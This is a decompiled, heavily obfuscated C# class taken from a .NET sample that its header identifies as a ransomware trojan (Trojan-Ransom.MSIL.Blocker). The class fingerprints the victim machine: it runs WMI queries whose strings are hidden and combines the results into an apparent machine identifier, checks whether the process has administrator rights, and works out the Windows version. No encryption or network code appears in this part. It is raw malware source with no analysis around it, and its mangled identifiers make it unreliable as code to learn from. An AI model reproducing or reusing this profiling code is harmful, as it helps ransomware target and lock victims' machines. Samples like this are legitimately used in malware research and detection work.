// Decompiled with JetBrains decompiler
// Type: .

// Assembly: System, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BCD7F698-81A9-45B6-B776-A5010DB561F8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-fa05b3c64ba6163bb64b30062883b6f46b0f1c15f6c74963ec9341db78f63ddb.exe

using \u0001\u000E\u0003\u0004;
using System;
using System.Management;
using System.Security.Principal;

namespace \u0001\u000E\u0003\u0004
{
  internal class \u000A\u0005\u000B\u0006
  {
    public static string \u0005\u000C\u0006() => \u000C\u000E.\u0010\u0007((\u000A\u0005\u000B\u0006.\u0002\u0008\u0011() + \u000A\u0005\u000B\u0006.\u0002\u0004() + \u000A\u0005\u000B\u0006.\u0002()).ToString());

    private static string \u0002\u0008\u0011()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000C\u000F\u0010\u0011(), \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000D\u000E\u0009\u0007\u0007());
      string empty = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
        empty = Convert.ToString(managementBaseObject[\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0006\u0001\u0011()]);
      return empty;
    }

    private static string \u0002\u0004()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000C\u000F\u0010\u0011(), \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0005\u0002\u0005\u0009());
      string empty = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
        empty = Convert.ToString(managementBaseObject[\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000A\u0006\u0006\u0010()]);
      return empty;
    }

    private static string \u0002()
    {
      string environmentVariable = Environment.GetEnvironmentVariable(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000B\u0007());
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000C\u000F\u0010\u0011(), \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000B\u0005() + environmentVariable + \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0005\u0003\u0008());
      string empty = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
        empty = Convert.ToString(managementBaseObject[\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000B\u0005\u000D()]);
      return empty;
    }

    public static bool \u0010\u0007\u000B\u0003\u000C\u0003()
    {
      try
      {
        return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
      }
      catch
      {
        return false;
      }
    }

    public static string \u000B\u0005\u000F()
    {
      OperatingSystem osVersion = Environment.OSVersion;
      Version version = osVersion.Version;
      string str = \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000D\u0010\u0005();
      if (osVersion.Platform == PlatformID.Win32Windows)
      {
        switch (version.Minor)
        {
          case 0:
            str = \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000C\u000E\u0003();
            break;
          case 10:
            str = !(version.Revision.ToString() == \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0003\u000D\u000A\u000F()) ? \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0002\u0001\u0004\u000D\u0010() : \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000F\u0005\u0009\u0011\u0011\u000E();
            break;
          case 90:
            str = \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000E\u000E();
            break;
        }
      }
      else if (osVersion.Platform == PlatformID.Win32NT)
      {
        switch (version.Major)
        {
          case 3:
            str = \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0010\u0009();
            break;
          case 4:
            str = \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000E\u000C();
            break;
          case 5:
            str = version.Minor != 0 ? \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0003\u0006() : \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0007();
            break;
          case 6:
            str = version.Minor != 0 ? \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000F\u0010\u0007\u000B() : \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0008\u0006();
            break;
        }
      }
      return str;
    }
  }
}
